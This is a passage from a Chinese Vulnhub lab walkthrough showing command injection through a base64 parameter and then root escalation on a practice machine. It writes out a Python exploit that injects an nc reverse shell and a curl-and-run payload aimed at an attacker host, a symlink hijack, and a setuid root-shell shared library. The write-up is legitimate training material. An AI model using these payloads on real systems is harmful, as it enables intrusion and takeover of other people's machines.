+chdir(&#39;../&#39;);
+
+?&gt;
+</code></pre><p>将参数f进行base64解密，当包含黑名单字符串时，记录到文件放在目录<code>/var/log/soc/</code>，然后 <code>/opt/ids_strong_bvb.py</code> 执行，精简一下</p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>&lt;?php
+</span></span><span style=display:flex><span><span style=color:#00688b>$imagefile</span> = base64_decode(<span style=color:#00688b>$_GET</span>[<span style=color:#cd5555>&#39;f&#39;</span>]);
+</span></span><span style=display:flex><span><span style=color:#00688b>$fp</span> = fopen(<span style=color:#cd5555>&#39;/var/log/soc/&#39;</span>.<span style=color:#00688b>$logfile</span>, <span style=color:#cd5555>&#39;w&#39;</span>);
+</span></span><span style=display:flex><span>fwrite(<span style=color:#00688b>$fp</span>, <span style=color:#cd5555>&#34;&#39;&#34;</span>.<span style=color:#00688b>$imagefile</span>.<span style=color:#cd5555>&#34;&#39;&#34;</span>);
+</span></span><span style=display:flex><span>exec(<span style=color:#cd5555>&#39;python /opt/ids_strong_bvb.py &lt;/var/log/soc/&#39;</span>.<span style=color:#00688b>$logfile</span>.<span style=color:#cd5555>&#39; &gt;/tmp/output 2&gt;&amp;1&#39;</span>);
+</span></span></code></pre></td></tr></table></div></div><h2 id=获得权限>获得权限</h2><p>尝试了各种nc反弹shell均失败，各种尝试，最终成功反弹shell ，<a href="https://saucer-man.com/reverse/?ip=10.0.2.24&amp;port=444">参考</a></p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>base64</span>,<span style=color:#008b45;text-decoration:underline>time</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>from</span> <span style=color:#008b45;text-decoration:underline>importlib.resources</span> <span style=color:#8b008b;font-weight:700>import</span> path
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>time</span>,<span style=color:#008b45;text-decoration:underline>requests</span>
+</span></span><span style=display:flex><span>timestamp = <span style=color:#658b00>str</span>(<span style=color:#658b00>int</span>(time.time())+<span style=color:#b452cd>8</span>)
+</span></span><span style=display:flex><span>path= <span style=color:#cd5555>b</span><span style=color:#cd5555>&#34;../etc/passwd&#39; and __import__(&#39;os&#39;).system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.2.24 444 &gt;/tmp/f&#39;) and &#39; &#34;</span>
+</span></span><span style=display:flex><span>file = base64.b64encode(path)
+</span></span><span style=display:flex><span>file=file.decode(<span style=color:#cd5555>&#34;utf-8&#34;</span>)
+</span></span><span style=display:flex><span>url = <span style=color:#cd5555>&#39;http://10.0.2.34/image_gallery.php?t=&#39;</span>+ timestamp +<span style=color:#cd5555>&#39;&amp;f=&#39;</span>+file
+</span></span><span style=display:flex><span><span style=color:#658b00>print</span>(<span style=color:#cd5555>&#39;http://10.0.2.34/img/&#39;</span> + path.decode(<span style=color:#cd5555>&#34;utf-8&#34;</span>))
+</span></span><span style=display:flex><span><span style=color:#658b00>print</span>(url)
+</span></span><span style=display:flex><span>res = requests.get(url)
+</span></span><span style=display:flex><span><span style=color:#658b00>print</span>(res.text)
+</span></span></code></pre></td></tr></table></div></div><p>后面想直接下载反弹脚本并执行</p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>path= <span style=color:#cd5555>b</span><span style=color:#cd5555>&#34;../etc/passwd&#39; and __import__(&#39;os&#39;).system(&#39;curl http://10.0.2.24/reverse/r444.py -o /tmp/r444.py;python /tmp/r444.py&#39;) and &#39; &#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>一样成功获得反弹shell</p><p><img src=https://www.vulnhub.cn/walkthrough/374/5.webp alt=5></p><h2 id=提权>提权</h2><p><img src=https://www.vulnhub.cn/walkthrough/374/6.webp alt=6></p><p>查看目录<code>/var/www/html/web_utils/</code>权限可写，先上php一句话方便编辑文件</p><p><img src=https://www.vulnhub.cn/walkthrough/374/7.webp alt=7></p><p>进一步查看文件<code>clear_logs</code>发现是个软链接</p><p><img src=https://www.vulnhub.cn/walkthrough/374/8.webp alt=8></p><h3 id=bytevsbyte>bytevsbyte</h3><p>果断重置软链接</p><pre tabindex=0><code>ln -fns /tmp/clear_logsc /var/www/html/web_utils/clear_logs
+echo &#39;#!/bin/bash\n/bin/bash&#39; &gt; /tmp/clear_logsc
+chmod 777 /tmp/clear_logsc
+</code></pre><p>尝试切换至用户<code>bytevsbyte</code></p><pre tabindex=0><code>sudo -u bytevsbyte /var/www/html/web_utils/clear_logs
+</code></pre><p><img src=https://www.vulnhub.cn/walkthrough/374/9.webp alt=9></p><p>下载<code>~/.ssh/id_rsa</code>登录</p><p><img src=https://www.vulnhub.cn/walkthrough/374/10.webp alt=10></p><h3 id=linpeassh>linpeas.sh</h3><p><img src=https://www.vulnhub.cn/walkthrough/374/11.webp alt=11></p><p>跟踪到<code>/usr/test</code>目录发现疑似<code>testlib</code>的源码</p><p><img src=https://www.vulnhub.cn/walkthrough/374/12.webp alt=12></p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#1e889b>#include</span> <span style=color:#1e889b>&lt;dlfcn.h&gt;</span><span style=color:#1e889b>
+</span></span></span><span style=display:flex><span><span style=color:#1e889b>#include</span> <span style=color:#1e889b>&lt;unistd.h&gt;</span><span style=color:#1e889b>
+</span></span></span><span style=display:flex><span><span style=color:#1e889b></span>
+</span></span><span style=display:flex><span><span style=color:#00688b;font-weight:700>int</span> <span style=color:#008b45>main</span>(<span style=color:#00688b;font-weight:700>int</span> argc, <span style=color:#00688b;font-weight:700>char</span> *argv[]){
+</span></span><span style=display:flex><span>    <span style=color:#00688b;font-weight:700>void</span> *handle;
+</span></span><span style=display:flex><span>    <span style=color:#00688b;font-weight:700>int</span> (*function)();
+</span></span><span style=display:flex><span>    <span style=color:#8b008b;font-weight:700>if</span>(argc &lt; <span style=color:#b452cd>2</span>)
+</span></span><span style=display:flex><span>        <span style=color:#8b008b;font-weight:700>return</span> <span style=color:#b452cd>1</span>;
+</span></span><span style=display:flex><span>    handle = <span style=color:#008b45>dlopen</span>(argv[<span style=color:#b452cd>1</span>], RTLD_LAZY);
+</span></span><span style=display:flex><span>    function = <span style=color:#008b45>dlsym</span>(handle, <span style=color:#cd5555>&#34;test_this&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#008b45>function</span>();
+</span></span><span style=display:flex><span>    <span style=color:#8b008b;font-weight:700>return</span> <span style=color:#b452cd>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></td></tr></table></div></div><p>大概是执行后带文件主函数为<code>test_this</code></p><p>找了一圈，参考</p><pre tabindex=0><code>https://github.com/jivoi/pentest/blob/master/shell/rootshell.c
+</code></pre><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#1e889b>#include</span> <span style=color:#1e889b>&lt;stdio.h&gt;</span><span style=color:#1e889b>
+</span></span></span><span style=display:flex><span><span style=color:#1e889b>#include</span> <span style=color:#1e889b>&lt;sys/types.h&gt;</span><span style=color:#1e889b>
+</span></span></span><span style=display:flex><span><span style=color:#1e889b>#include</span> <span style=color:#1e889b>&lt;unistd.h&gt;</span><span style=color:#1e889b>
+</span></span></span><span style=display:flex><span><span style=color:#1e889b></span><span style=color:#00688b;font-weight:700>int</span> <span style=color:#008b45>test_this</span>(<span style=color:#00688b;font-weight:700>void</span>)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span><span style=color:#008b45>setuid</span>(<span style=color:#b452cd>0</span>); <span style=color:#008b45>setgid</span>(<span style=color:#b452cd>0</span>); <span style=color:#008b45>system</span>(<span style=color:#cd5555>&#34;/bin/bash&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></td></tr></table></div></div><p>先在kali上编译</p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gcc -fPIC -shared rootshell.c -o test_this
+</span></span></code></pre></td></tr></table></div></div><p>在靶机上执行</p><p><img src=https://www.vulnhub.cn/walkthrough/374/13.webp alt=13></p><p>成功获得root权限</p><hr width=100% id=EOF><p style=color:#777>最后修改于 2019-09-28</p></div></div><nav class=post-pagination><a class=newer-posts href=/walkthrough/424/>下回<br>Vulnhub 424 SUNSET DAWN2</a>
+<a class=older-posts href=/walkthrough/249/>上回<br>Vulnhub 249 LAMPIÃO 1</a></nav><div class=post-comment-wrapper></div></div></div></div></div><div id=sideContainer class=side-container><a class="a-block nav-head false" href=https://www.vulnhub.cn><div class=nav-title>Vulnhub靶机教程</div><div class=nav-subtitle>Themed by Diary.</div></a><div class=nav-link-list><a class="a-block nav-link-item active" href=/walkthrough>Walkthroughs</a>
+<a class="a-block nav-link-item false" href=/posts>Archive</a>
+<a class="a-block nav-link-item false" href=/categories>Categories</a>
+<a class="a-block nav-link-item false" href=/tags>Tags</a>
+<a class="a-block nav-link-item false" href=/index.xml>RSS Feed</a></div><div class=nav-footer>Hugo Theme <a href=https://github.com/amazingrise/hugo-theme-diary>Diary</a> by <a href=https://risehere.net/>Rise</a><br>移植自 <a href=https://mak1t0.cc/ target=_blank rel="noreferrer noopener">Makito</a>'s <a href=https://github.com/SumiMakito/hexo-theme-journal/ target=_blank rel="noreferrer noopener">Journal.</a><br><br>&copy;
+This is a customized copyright.</div></div><div id=extraContainer class=extra-container><div class=toc-wrapper><div class=toc><div class=toc-content><center>- 目录 -</center><ul><ul><li><a href=#%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae class=nav-环境配置>环境配置</a></li><li><a href=#%e5%88%9d%e6%ad%a5%e6%89%93%e7%82%b9 class=nav-初步打点>初步打点</a></li><ul><li><a href=#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f class=nav-端口扫描>端口扫描</a></li><li><a href=#web%e6%b5%8b%e8%af%95 class=nav-web测试>web测试</a></li><ul><li><a href=#%e5%8f%82%e6%95%b0t class=nav-参数t>参数t</a></li><li><a href=#%e5%8f%82%e6%95%b0f class=nav-参数f>参数f</a></li></ul></ul><li><a href=#%e8%8e%b7%e5%be%97%e6%9d%83%e9%99%90 class=nav-获得权限>获得权限</a></li><li><a href=#%e6%8f%90%e6%9d%83 class=nav-提权>提权</a></li><ul><li><a href=#bytevsbyte class=nav-bytevsbyte>bytevsbyte</a></li><li><a href=#linpeassh class=nav-linpeassh>linpeas.sh</a></li></ul></div></div></div><div class=pagination><a id=globalBackToTop class="pagination-action animated-visibility" href=#top :class="{ invisible: scrollY == 0 }"><i class="material-icons pagination-action-icon">keyboard_arrow_up</i></a>
+<a type=button class=pagination-action id=darkModeToggleButton><span class="material-icons pagination-action-icon" id=darkModeToggleIcon>dark_mode</span></a></div></div><div id=single-column-footer>Hugo Theme <a href=https://github.com/amazingrise/hugo-theme-diary>Diary</a> by <a href=https://risehere.net/>Rise</a><br>移植自 <a href=https://mak1t0.cc/ target=_blank rel="noreferrer noopener">Makito</a>'s <a href=https://github.com/SumiMakito/hexo-theme-journal/ target=_blank rel="noreferrer noopener">Journal.</a><br><br>&copy;
+This is a customized copyright.</div></div><script src=/js/journal.js></script></body></html>
